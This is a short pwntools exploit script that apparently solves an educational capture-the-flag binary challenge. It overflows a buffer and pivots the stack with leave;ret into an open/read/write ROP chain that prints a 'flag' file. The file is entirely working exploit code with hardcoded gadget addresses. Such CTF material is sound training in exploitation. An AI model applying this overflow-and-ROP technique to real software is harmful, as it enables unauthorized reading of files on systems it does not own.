from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./chal')
#p = remote( 'edu-ctf.zoolab.org', 10005 )

ROP = 0x4e3360
fn = 0x4e3340

pop_rax_ret = 0x45db87
pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_pop_rbx_ret = 0x493a2b
leave_ret = 0x40190c
syscall = 0x40f4c4

rop = flat(
    pop_rax_ret, 2,
    pop_rdi_ret, fn,
    pop_rsi_ret, 0,
    syscall,

    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, fn,
    pop_rdx_pop_rbx_ret, 0x30, 0,
    syscall,

    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, fn,
    pop_rdx_pop_rbx_ret, 0x30, 0,
    syscall,
)

p.sendlineafter( "Give me filename: ", b'flag\x00' )
p.sendafter( "Give me ROP: ", b'A' * 0x8 + rop )
p.sendafter( "Give me overflow: ", b'A' * 0x20 + p64( ROP ) + p64( leave_ret ) )
gdb.attach(p)

p.interactive()
